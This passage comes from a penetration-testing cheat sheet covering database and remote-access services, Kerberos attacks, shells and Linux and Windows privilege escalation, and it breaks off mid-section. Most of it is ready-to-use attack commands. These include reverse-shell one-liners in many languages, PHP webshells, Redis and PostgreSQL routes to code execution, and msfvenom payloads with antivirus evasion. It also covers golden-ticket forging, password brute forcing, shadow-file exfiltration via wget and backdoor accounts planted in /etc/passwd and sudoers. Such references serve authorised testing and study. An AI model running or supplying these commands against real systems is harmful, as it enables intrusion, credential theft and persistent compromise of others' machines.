### PostgreSQL Commands
```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;
SELECT user;

-- Databases
\l                                       -- List databases
SELECT datname FROM pg_database;

-- Connect to DB
\c <dbname>

-- Tables
\dt
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- Users
\du
SELECT usename, passwd FROM pg_shadow;   -- Requires superuser

-- Quit
\q
```

### PostgreSQL Code Execution
```sql
-- COPY command for file read
COPY passwd FROM '/etc/passwd';          -- Read into table

-- Large Object for file write
SELECT lo_import('/etc/passwd');
SELECT lo_export(17001, '/tmp/passwd_copy');

-- Command execution via COPY
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"';
```

### PostgreSQL Extensions (RCE)
```bash
# If superuser — install extensions
CREATE EXTENSION adminpack;
# Use pg_read_file
SELECT pg_read_file('/etc/passwd');
```

---

## [OG-15] 12. MongoDB

### Enumeration
```bash
nmap -sV -p 27017 <IP>
nmap --script=mongodb-info,mongodb-databases -p 27017 <IP>
```

### Authentication
```bash
mongo <IP>
mongo <IP>:27017
mongo --host <IP> -u admin -p pass --authenticationDatabase admin
mongo "mongodb://admin:pass@<IP>:27017/admin"
```

### MongoDB Commands
```bash
# Show databases
show dbs

# Use database
use <dbname>

# Show collections
show collections

# Query
db.<collection>.find()
db.<collection>.find().pretty()
db.<collection>.find({key: "value"})
db.<collection>.findOne()

# Count
db.<collection>.count()

# Users
use admin
db.system.users.find()

# All users
db.getUsers()

# Server info
db.serverStatus()
db.version()
```

### MongoDB Auth Bypass (NoSQL Injection)
```bash
# HTTP parameter injection
user[$ne]=invalid&pass[$ne]=invalid
user=admin&pass[$gt]=
{"username": {"$ne": null}, "password": {"$ne": null}}

# URL encoded
user%5b%24ne%5d=invalid&pass%5b%24ne%5d=invalid
```

---

## [OG-16] 13. Redis

### Enumeration
```bash
nmap -sV -p 6379 <IP>
nmap --script=redis-info -p 6379 <IP>
```

### Authentication
```bash
redis-cli -h <IP>
redis-cli -h <IP> -p 6379
redis-cli -h <IP> -a <password>

# Auth after connection
AUTH <password>
```

### Redis Commands
```bash
INFO                                     # Server info (reveals OS, version, config path)
INFO server
INFO keyspace
KEYS *                                   # List all keys
KEYS user*                               # Pattern match
GET <key>                                # Get value
SET <key> <value>                        # Set value
CONFIG GET *                             # Get all config
CONFIG GET dir                           # Working directory
CONFIG GET dbfilename                    # DB filename
CONFIG SET dir /var/www/html             # Change dir
CONFIG SET dbfilename shell.php          # Change file
DBSIZE                                   # Number of keys
SELECT 0                                 # Select database 0-15
FLUSHALL                                 # Dangerous! Delete all
CLIENT LIST                              # Connected clients
```

### Redis to RCE
```bash
# Method 1: Write webshell
redis-cli -h <IP>
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system(\$_GET['cmd']); ?>"
BGSAVE

# Method 2: SSH authorized keys
redis-cli -h <IP>
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET payload "\n\n\nssh-rsa AAAA...yourpubkey...\n\n\n"
BGSAVE

# Method 3: Cron job
redis-cli -h <IP>
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET payload "\n\n*/1 * * * * bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1\n\n"
BGSAVE
```

---

## [OG-17] 14. RDP

### Enumeration
```bash
nmap -sV -p 3389 <IP>
nmap --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <IP>
```

### Authentication
```bash
# rdesktop
rdesktop <IP>
rdesktop -u user -p pass <IP>
rdesktop -u administrator -p pass -d DOMAIN <IP>
rdesktop -u user -p pass -f <IP>         # Fullscreen

# xfreerdp
xfreerdp /u:user /p:pass /v:<IP>
xfreerdp /u:user /p:pass /v:<IP> /port:3389
xfreerdp /u:user /p:pass /v:<IP> /d:DOMAIN
xfreerdp /u:administrator /p:pass /v:<IP> /cert:ignore +clipboard
xfreerdp /u:user /p:pass /v:<IP> /dynamic-resolution /drive:kali,/tmp   # Mount local drive

# Pass the Hash via RDP (Restricted Admin mode)
xfreerdp /u:admin /pth:<NTLM_hash> /v:<IP> /cert:ignore
```

### Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<IP>
hydra -L users.txt -P passes.txt rdp://<IP>
ncrack -p 3389 -u admin -P /usr/share/wordlists/rockyou.txt <IP>
crowbar -b rdp -s <IP>/32 -u admin -C /usr/share/wordlists/rockyou.txt
```

### BlueKeep (CVE-2019-0708)
```bash
nmap --script=rdp-vuln-ms12-020 -p 3389 <IP>
# Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOST <IP>
run
```

---

## [OG-18] 15. VNC

### Enumeration
```bash
nmap -sV -p 5900,5901,5902 <IP>
nmap --script=vnc-info,vnc-brute -p 5900 <IP>
```

### Authentication
```bash
vncviewer <IP>
vncviewer <IP>:1                         # Display 1
vncviewer <IP>::5901
# With password
vncviewer -passwd <passfile> <IP>

# TigerVNC
vncviewer -SecurityTypes VncAuth <IP>
```

### Brute Force
```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://<IP>
ncrack -p 5900 -P /usr/share/wordlists/rockyou.txt <IP>
medusa -h <IP> -P /usr/share/wordlists/rockyou.txt -M vnc
```

### VNC Password Decryption
```bash
# VNC stores passwords in: ~/.vnc/passwd or /root/.vnc/passwd
# Decrypt with:
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["your_hex_here"].pack('H*'), fixedkey

# Or use vncpwd:
vncpwd <hex_of_passwd_file>
# Or online: https://github.com/jeroennijhof/vncpwd
```

---

## [OG-19] 16. Telnet

### Enumeration
```bash
nmap -sV -p 23 <IP>
nmap --script=telnet-brute,telnet-ntlm-info -p 23 <IP>
```

### Authentication
```bash
telnet <IP>
telnet <IP> 23
nc -nv <IP> 23
```

### Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://<IP>
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h <IP> -M telnet
```

---

## [OG-20] 17. LDAP

### Enumeration
```bash
nmap -sV -p 389,636 <IP>
nmap --script=ldap-search,ldap-rootdse -p 389 <IP>

# ldapsearch
ldapsearch -H ldap://<IP> -x                           # Anonymous bind
ldapsearch -H ldap://<IP> -x -s base                   # Base info
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com"    # Base DN
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=*)"   # All objects
ldapsearch -H ldap://<IP> -D "user@domain.com" -w pass -b "DC=domain,DC=com"  # Authenticated

# Find users
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=person)" cn

# Find computers
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=computer)" cn

# Find groups
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=group)" cn

# Password policy
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=com" "(objectClass=domainDNS)" minPwdLength

# ldapdomaindump
ldapdomaindump <IP> -u 'DOMAIN\user' -p 'pass'
ldapdomaindump <IP> -u 'user@domain.com' -p 'pass' -o /tmp/ldap_dump

# windapsearch
python3 windapsearch.py --dc-ip <IP> -u "" --functionality   # Anonymous
python3 windapsearch.py --dc-ip <IP> -d domain.com -u user -p pass -U   # Users
python3 windapsearch.py --dc-ip <IP> -d domain.com -u user -p pass -G   # Groups
python3 windapsearch.py --dc-ip <IP> -d domain.com -u user -p pass -C   # Computers
```

---

## [OG-21] 18. SNMP

### Enumeration
```bash
nmap -sU -p 161 <IP>
nmap -sU -p 161 --script=snmp-info,snmp-sysdescr,snmp-netstat,snmp-processes -sV <IP>
nmap -sU -p 161 --script=snmp-brute <IP>

# snmpwalk
snmpwalk -v2c -c public <IP>             # Community string "public"
snmpwalk -v2c -c private <IP>
snmpwalk -v1 -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25   # Windows users

# snmp-check
snmp-check <IP>
snmp-check <IP> -c public
snmp-check <IP> -c private

# onesixtyone — community string brute force
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <IP>
onesixtyone -i targets.txt -c /usr/share/doc/onesixtyone/dict.txt

# snmpwalk useful OIDs
# 1.3.6.1.2.1.25.4.2.1.2    — Running processes
# 1.3.6.1.2.1.25.6.3.1.2    — Installed software
# 1.3.6.1.2.1.6.13.1.3      — Open TCP ports
# 1.3.6.1.2.1.25.1.6.0      — System users
# 1.3.6.1.4.1.77.1.2.25     — Windows users

snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2   # Processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2   # Software
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.6.13.1.3     # TCP ports

# braa — bulk SNMP query
braa public@<IP>:.1.*
```

---

## [OG-22] 19. Kerberos

### Enumeration
```bash
nmap -sV -p 88 <IP>
nmap --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" -p 88 <IP>

# kerbrute — user enumeration
kerbrute userenum --dc <IP> -d DOMAIN.COM users.txt
kerbrute passwordspray --dc <IP> -d DOMAIN.COM users.txt 'Password123'
kerbrute bruteuser --dc <IP> -d DOMAIN.COM administrator passwords.txt
```

### AS-REP Roasting
```bash
# Get TGT for users without pre-auth (do not need creds)
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip <IP> -format hashcat
impacket-GetNPUsers domain.com/user:pass -request -dc-ip <IP>
impacket-GetNPUsers domain.com/ -no-pass -usersfile users.txt -dc-ip <IP>

# With CrackMapExec
crackmapexec ldap <IP> -u user -p pass --asreproast asrep.txt

# Crack hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
```

### Kerberoasting
```bash
# Get TGS tickets for service accounts (need valid creds)
impacket-GetUserSPNs domain.com/user:pass -dc-ip <IP> -request
impacket-GetUserSPNs domain.com/user:pass -dc-ip <IP> -outputfile kerberoast.txt

# With CrackMapExec
crackmapexec ldap <IP> -u user -p pass --kerberoasting kerb.txt

# With Rubeus (on Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### Pass the Ticket
```bash
# Export tickets on Windows
Rubeus.exe dump /service:krbtgt /nowrap
mimikatz sekurlsa::tickets /export

# Import ticket on Linux
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain.com/user@target
```

### Golden Ticket
```bash
# Requires: domain, domain SID, KRBTGT hash
# Get SID
impacket-lookupsid domain.com/user:pass@DC_IP

# Get KRBTGT hash (domain admin required)
impacket-secretsdump domain.com/admin:pass@DC_IP | grep krbtgt

# Create golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.com -spn cifs/dc.domain.com admin_user
export KRB5CCNAME=admin_user.ccache
impacket-psexec -k -no-pass domain.com/admin_user@dc.domain.com

# Mimikatz
mimikatz kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXX /krbtgt:<hash> /ticket:golden.kirbi
kerberos::ptt golden.kirbi
```

### Silver Ticket
```bash
# Requires: target service hash, domain SID, SPN
impacket-ticketer -nthash <service_hash> -domain-sid <SID> -domain domain.com -spn cifs/target.domain.com user
```

---

## [OG-23] 20. Exploitation & Shells

### Reverse Shell One-Liners
```bash
# Bash
bash -i >& /dev/tcp/<IP>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
0<&196;exec 196<>/dev/tcp/<IP>/4444; sh <&196 >&196 2>&196

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'

# Perl
perl -e 'use Socket;$i="<IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh <IP> 4444
nc -e /bin/bash <IP> 4444
nc <IP> 4444 | /bin/sh | nc <IP> 4445   # Two netcat approach
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"

# PowerShell base64
$t = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($t)
$enc = [Convert]::ToBase64String($bytes)
powershell -e $enc

# Windows cmd
# using socat
socat TCP4:<IP>:4444 EXEC:/bin/bash
socat TCP4:<IP>:4444 EXEC:'cmd.exe',pipes
```

### Shell Listeners
```bash
# Netcat
nc -lvnp 4444
nc -lvnp 4444 -e /bin/bash              # Bind shell listener

# Rlwrap for better shell
rlwrap nc -lvnp 4444

# Socat
socat -d -d TCP4-LISTEN:4444 STDOUT
socat TCP4-LISTEN:4444,fork EXEC:/bin/bash

# Metasploit multi handler
use exploit/multi/handler
set PAYLOAD linux/x86/shell_reverse_tcp    # or windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
```

### Shell Upgrade (TTY)
```bash
# Method 1 — Python pty
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Method 2 — Full interactive shell
# In reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z                                   # Background nc
stty raw -echo; fg                       # Fix terminal
# Press Enter
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 columns 200                 # Fix size

# Method 3 — Script
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset

# Method 4 — socat
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
```

### Msfvenom Payloads
```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe

# Windows DLL
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll > shell.dll

# Web shells
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.jsp
msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f war > shell.war

# Encoded (basic AV evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > shell.exe

# Python
msfvenom -p python/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.py

# Macro (MS Office)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f vba
```

### Searchsploit
```bash
searchsploit <service> <version>
searchsploit apache 2.4.49
searchsploit -m 12345                    # Mirror exploit locally
searchsploit -x 12345                    # Examine exploit
searchsploit --update                    # Update DB
searchsploit -t <keyword>                # Title search only
searchsploit --www <keyword>             # Open in browser
```

---

## [OG-24] 21. Privilege Escalation — Linux

### Fast Triage Checklist
- [ ] Ran enumeration (id, whoami, uname -a)
- [ ] Checked capabilities (`getcap -r / 2>/dev/null`)
- [ ] Checked SUID (`find / -perm -4000 2>/dev/null`)
- [ ] Checked sudo (`sudo -l`)
- [ ] Checked cron (`ls -la /etc/cron*`)
- [ ] Checked PATH (`echo $PATH`)
- [ ] Looked for credentials in configs/backups
- [ ] Got root?

### Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

---

### Initial Enumeration
```bash
# Basic info
id; whoami; uname -a; cat /etc/os-release; hostname
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow
cat /etc/group

# Environment
env; echo $PATH; printenv

# Network
ifconfig; ip a; ip route; netstat -antup; ss -antup
cat /etc/hosts
arp -a

# Processes
ps aux
ps aux --forest
top
```

### Automated Tools
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh
./linpeas.sh -a                          # All checks (noisy)

# LinEnum
./LinEnum.sh -r report -e /tmp/

# Linux Smart Enumeration
./lse.sh
./lse.sh -l 1                           # Level 1
./lse.sh -l 2                           # Level 2 (more checks)

# Unix-privesc-check
./unix-privesc-check standard
./unix-privesc-check detailed
```

### SUID / SGID
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm /6000 -type f 2>/dev/null

# GTFOBins — check if binary is exploitable
# https://gtfobins.github.io/

# Common exploitable SUID binaries
# nmap (older): nmap --interactive → !sh
# vim: vim -c ':!/bin/sh'
# find: find . -exec /bin/sh -p \; -quit
# awk: awk 'BEGIN {system("/bin/sh")}'
# perl: perl -e 'exec "/bin/sh";'
# python: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# less: less /etc/passwd → !sh
# more: more /etc/passwd → !sh
# man: man man → !sh
# cp: cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p
# bash: bash -p
# dash: dash -p
# env: env /bin/sh -p
# tee: echo "data" | tee /etc/sudoers
# strace: strace -o /dev/null /bin/sh -p
# sed: sed -n '1e exec sh 1>&0' /etc/passwd
```

### Sudo Abuse
```bash
sudo -l                                  # What can we run as sudo?
sudo -l -U user                          # Check another user (if we're root)
sudo su                                  # Switch to root
sudo /bin/bash

# Sudo without password
# Check /etc/sudoers for NOPASSWD entries
cat /etc/sudoers

# Sudo version exploits
sudo --version
# CVE-2021-3156 Baron Samedit (sudo < 1.9.5p2)
# CVE-2019-14287 (sudo < 1.8.28) sudo -u#-1 /bin/bash

# Common sudoable commands exploits (GTFOBins)
sudo find /var -exec /bin/sh \;
sudo less /etc/shadow → !sh
sudo vim → :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh"
sudo env /bin/sh
sudo ftp → ! /bin/sh
sudo strace -o /dev/null /bin/sh
sudo rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
sudo php -r "system('/bin/sh');"
sudo curl file:///etc/shadow
sudo wget http://localhost/ -O /tmp/test --post-file=/etc/shadow
```

### Cron Jobs
```bash
# List cron jobs
cat /etc/crontab
ls -la /etc/cron*
ls /var/spool/cron/crontabs/
crontab -l
cat /var/spool/cron/crontabs/root
ls -la /etc/cron.d/

# Watch processes (detect cron jobs)
watch -n 1 "ps -ef | grep -v watch"
pspy64                                   # Process snooper — great for cron

# Cron PATH abuse
# If cron runs script without full path and PATH is user-writable:
# Place malicious script earlier in PATH

# Writable cron script
echo '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/4444 0>&1' > /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh

# Wildcard injection in cron
# e.g., cron runs: tar czf /tmp/backup.tar.gz /var/www/*
# Create files that are interpreted as flags:
touch '/var/www/html/--checkpoint=1'
touch '/var/www/html/--checkpoint-action=exec=sh shell.sh'
echo "chmod +s /bin/bash" > /var/www/html/shell.sh
chmod +x /var/www/html/shell.sh
```

### Writable Files & Directories
```bash
# Find world-writable files
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# /etc/passwd writable
openssl passwd -1 -salt salt123 password123
echo "hacker:$1$salt123$SomeHashHere:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker

# /etc/shadow writable
openssl passwd -6 newpassword
# Replace root password hash

# /etc/sudoers writable
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# ~/.bashrc or ~/.profile writable (wait for user activity or sudo usage)
echo "bash -i >& /dev/tcp/<IP>/4444 0>&1" >> ~/.bashrc
```

### PATH Hijacking
```bash
# If vulnerable binary calls commands without full path
strings /suid_binary | grep -v "/"      # Find unqualified command names

# Create malicious command
echo '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/4444 0>&1' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
./suid_binary                            # Now calls our malicious 'service'
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# Look for cap_setuid, cap_net_admin, cap_dac_override, etc.

# Common exploits
# python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash"'

# openssl with cap_net_admin:
# Can read files
openssl enc -in /etc/shadow
```

### Kernel Exploits
```bash
uname -a                                 # Get kernel version
cat /etc/os-release
lsb_release -a

# Search for exploits
searchsploit linux kernel <version>

# Dirty COW (CVE-2016-5195) — Linux < 4.8.3
searchsploit dirty cow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword

# PwnKit (CVE-2021-4034) — pkexec SUID
# Works on most Linux distros
git clone https://github.com/ly4k/PwnKit
cd PwnKit; sh install.sh

# DirtyPipe (CVE-2022-0847) — Linux 5.8 - 5.16.11
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
```

### Services & Ports
```bash
# Check internal services
ss -antup
netstat -antup
ss -tulnp
netstat -tulnp

# Check running services
service --status-all
systemctl list-units --type=service
ps aux | grep <service>

# Check configs for creds
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

### Password Hunting
```bash
# Find interesting files
find / -name "*.txt" 2>/dev/null
find / -name "*.config" 2>/dev/null
find / -name "*.cfg" 2>/dev/null
find / -name "*.ini" 2>/dev/null
find / -name "id_rsa*" 2>/dev/null
find / -name ".htpasswd" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
cat ~/.nano_history

# Look for credentials in common locations
cat /var/www/html/*.php | grep -i "pass\|db_\|user"
find /var/www -name "config*"
cat /etc/apache2/sites-enabled/*.conf
cat /etc/nginx/sites-enabled/*
```

---

## [OG-25] 22. Privilege Escalation — Windows

### Initial Enumeration
```cmd
:: System info
systeminfo
hostname
whoami
whoami /priv
whoami /groups
net user
net user <username>
net localgroup
net localgroup administrators

:: Network
ipconfig /all
netstat -ano
route print
arp -a

:: Processes
tasklist /SVC
sc query
wmic service list brief
```

### Automated Tools
```cmd
:: WinPEAS
.\winPEASx64.exe
.\winPEASx86.exe
.\winPEASany.exe log

:: PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
powershell "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1');Invoke-AllChecks"

:: Seatbelt
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=system

:: SharpUp
.\SharpUp.exe audit
```

### Windows SUID Equivalents (Token Privileges)
```cmd
:: Check privileges
whoami /priv

:: SeImpersonatePrivilege → JuicyPotato / PrintSpoofer / RoguePotato
.\JuicyPotato.exe -l 1337 -p "C:\windows\system32\cmd.exe" -a "/c net user hacker P@ss123 /add" -t *
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > C:\temp\out.txt" -t * -c {CLSID}
.\PrintSpoofer.exe -i -c cmd

:: SeBackupPrivilege → Read any file
robocopy /B "C:\Windows\System32\config" "C:\tmp" SAM SYSTEM
# Then dump with secretsdump:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

:: SeTakeOwnershipPrivilege
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant <user>:F
copy cmd.exe utilman.exe
# Lock screen → Utility Manager → get cmd as SYSTEM

:: SeLoadDriverPrivilege → Capcom driver exploit
# Complex, see specific POC
```

### Unquoted Service Paths
```cmd
:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
sc query
sc qc <service_name>

:: PowerShell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '^"' -and $_.PathName -notmatch '^C:\\Windows'} | Select Name, PathName

:: Exploit: if path is C:\Program Files\My App\service.exe
:: Try placing malicious exe at:
:: C:\Program.exe
:: C:\Program Files\My.exe
:: C:\Program Files\My App\service.exe (if writable)
```

### Weak Service Permissions
```cmd
:: Check service permissions
accesschk.exe -ucqv <service_name>
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

:: PowerSploit
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService

:: Exploit modifiable service binary
:: Replace binary with malicious one:
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > service.exe
:: Copy to service binary location
sc start <service_name>

:: Or change service binary path:
sc config <service_name> binpath= "cmd.exe /c net user hacker P@ss /add"
sc start <service_name>
sc config <service_name> binpath= "cmd.exe /c net localgroup administrators hacker /add"
sc start <service_name>
```

### Registry Exploits
```cmd
:: AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must be 1 to be vulnerable
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

:: AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
:: If writable paths, replace binary

:: Stored credentials in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"
```

### Scheduled Tasks
```cmd
:: List tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr "Task Name\|Run As User\|Task To Run"

:: PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Select TaskName, TaskPath

:: Check if binary is writable
icacls "C:\path\to\task_binary.exe"
```

### DLL Hijacking
```cmd
:: Identify missing DLLs (use Process Monitor on Sysinternals)
procmon.exe
:: Filter: Result is NAME NOT FOUND, Path ends with .dll

:: Check safe DLL search order:
:: 1. Known DLLs
:: 2. App directory
:: 3. System directory (C:\Windows\System32)
:: 4. Windows dir
:: 5. Current dir
:: 6. PATH directories

:: Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll > hijack.dll
:: Place in writable directory that's searched before legit DLL
```

### Token Impersonation
```cmd
:: PrintSpoofer (Windows 10, Server 2016/2019)
